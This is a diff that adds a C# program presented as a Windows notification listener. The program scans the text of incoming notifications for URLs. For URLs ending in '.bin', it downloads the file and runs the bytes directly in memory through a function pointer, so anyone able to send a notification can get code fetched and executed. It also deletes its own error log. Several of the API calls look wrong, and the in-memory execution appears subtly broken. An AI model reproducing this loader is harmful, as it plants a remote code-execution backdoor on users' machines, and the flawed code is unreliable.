@@ -1,0 +1,167 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net.Http;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using Windows.UI.Notifications.Management;
+
+namespace NotificationListener
+{
+    class Program
+    {
+        private static string logFilePath = "error_log.txt";
+
+        static async Task Main(string[] args)
+        {
+            NotificationListener notificationListener = new NotificationListener();
+            notificationListener.AlarmNotificationReceived += NotificationListener_AlarmNotificationReceived;
+
+            Console.WriteLine("Listening for notifications...");
+
+            await RequestNotificationAccessAsync();
+
+            Console.ReadLine();
+        }
+
+        private static async Task RequestNotificationAccessAsync()
+        {
+            var status = await NotificationListener.GetAccessStatusAsync();
+            if (status != NotificationListenerAccessStatus.Allowed)
+            {
+                Console.WriteLine("Access to notifications was not granted.");
+                return;
+            }
+        }
+
+        private static async void NotificationListener_AlarmNotificationReceived(NotificationListener sender, NotificationAlarmEventArgs args)
+        {
+            var notification = args.Notification;
+
+            string title = notification.Title;
+            string body = notification.Body;
+
+            Console.WriteLine($"Received notification: {title} - {body}");
+
+            string url = ExtractUrl(body);
+            if (!string.IsNullOrEmpty(url) && ValidateUrl(url))
+            {
+                Console.WriteLine($"Detected URL: {url}");
+                if (url.EndsWith(".bin"))
+                {
+                    byte[] fileData = await DownloadFileAsync(url);
+                    if (fileData != null)
+                    {
+                        ExecuteBinaryInMemory(fileData);
+                    }
+                }
+                else
+                {
+                    await DownloadFileAsync(url);
+                }
+            }
+            else
+            {
+                LogError($"Invalid URL detected: {url}");
+            }
+        }
+
+        private static string ExtractUrl(string text)
+        {
+            string pattern = @"(http|https)://[^\s/$.?#].[^\s]*";
+            Match match = Regex.Match(text, pattern);
+            return match.Success ? match.Value : null;
+        }
+
+        private static bool ValidateUrl(string url)
+        {
+            // Validate URL format (this could be expanded)
+            return Uri.IsWellFormedUriString(url, UriKind.Absolute);
+        }
+
+        private static async Task<byte[]> DownloadFileAsync(string url)
+        {
+            using HttpClient client = new HttpClient();
+            try
+            {
+                Console.WriteLine($"Downloading file from {url}");
+                var response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
+                response.EnsureSuccessStatusCode();
+
+                long contentLength = response.Content.Headers.ContentLength ?? 0;
+                byte[] fileData = new byte[contentLength];
+                using (var contentStream = await response.Content.ReadAsStreamAsync())
+                {
+                    int bytesRead = 0;
+                    int read;
+                    long totalRead = 0;
+
+                    while ((read = await contentStream.ReadAsync(fileData, bytesRead, (int)(contentLength - totalRead))) > 0)
+                    {
+                        bytesRead += read;
+                        totalRead += read;
+                        TrackDownloadProgress(totalRead, contentLength);
+                    }
+                }
+
+                Console.WriteLine($"File downloaded successfully: {url}");
+                return fileData;
+            }
+            catch (Exception ex)
+            {
+                LogError($"Error downloading file: {ex.Message}");
+                return null;
+            }
+        }
+
+        private static void TrackDownloadProgress(long downloadedBytes, long totalBytes)
+        {
+            double percentage = (double)downloadedBytes / totalBytes * 100;
+            Console.WriteLine($"Download Progress: {percentage:0.00}%");
+        }
+
+        private static void ExecuteBinaryInMemory(byte[] binaryData)
+        {
+            IntPtr p = Marshal.AllocHGlobal(binaryData.Length);
+            Marshal.Copy(binaryData, 0, p, binaryData.Length);
+
+            var executable = (MainDelegate)Marshal.GetDelegateForFunctionPointer(p, typeof(MainDelegate));
+            executable();
+
+            Marshal.FreeHGlobal(p);
+        }
+
+        private static void LogError(string message)
+        {
+            try
+            {
+                File.AppendAllText(logFilePath, DateTime.Now + ": " + message + Environment.NewLine);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error logging: {ex.Message}");
+            }
+        }
+
+        private static string ExtractFileName(string url)
+        {
+            return Path.GetFileName(new Uri(url).LocalPath);
+        }
+
+        private static void CleanupResources()
+        {
+            // Implement any necessary cleanup logic here
+            // For instance, releasing unmanaged resources, handling logs, etc.
+            if (File.Exists(logFilePath))
+            {
+                File.Delete(logFilePath);
+            }
+            Console.WriteLine("Cleanup completed.");
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate void MainDelegate();
+    }
+}
